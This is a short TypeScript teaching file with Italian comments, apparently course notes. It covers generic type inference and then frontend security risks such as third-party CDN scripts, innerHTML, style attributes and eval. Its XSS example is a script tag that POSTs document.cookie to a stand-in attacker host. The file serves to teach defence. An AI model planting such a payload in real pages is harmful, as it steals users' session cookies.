// esempio di inference

function inferenceExample<Value>(x: Value) {
  return x;
}

const prova1 = inferenceExample(Math.random());

// esempio generics espicite
// @ts-ignore
const prova2 = inferenceExample<string>(45);

// SICUREZZA
// gli unici buchi di sicurezza lato frontend sono questi

// inclusione di javascript o css di terze parti, ad esempio da un cdn, o github, se la libreria utilizzata viene hackerata, il nostro sito diventa vulnerabile

// utilizzo di input dell'utente o dati del backend
// come html css o javascript

// esempi:

// recuperata dal backend
// inserita dall'utente
let stringaPericolosa;

// element.innerHTML = stringaPericolosa;

// element.setAttribute("style", stringaPericolosa);

// eval(stringaPericola);

// eval() is evil

// perchè è pericoloso?
// io malintenzionato su un forum, scrivo un post fatto cosi
// <script>fetch("server-malintezionato.io", { method: "POST", body: document.coookie })</script>

// <div style={{ color: stringaPericolosa }}> // ok perchè react sanifica
